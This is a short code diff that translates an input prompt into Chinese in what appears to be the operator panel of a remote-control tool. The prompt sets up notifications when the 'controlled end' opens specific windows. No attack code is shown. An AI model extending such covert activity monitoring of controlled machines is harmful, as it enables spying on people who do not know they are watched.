@@ -530,7 +530,7 @@ namespace Server
         {
             try
             {
-                string title = Interaction.InputBox("SEND A NOTIFICATION WHEN CLIENT OPEN A SPECIFIC WINDOW", "TITLE", "YouTube, Photoshop, Steam");
+                string title = Interaction.InputBox("当被控端打开特定窗口时发送通知", "标题", "YouTube, Photoshop, Steam");
                 if (string.IsNullOrEmpty(title))
                     return;
                 else
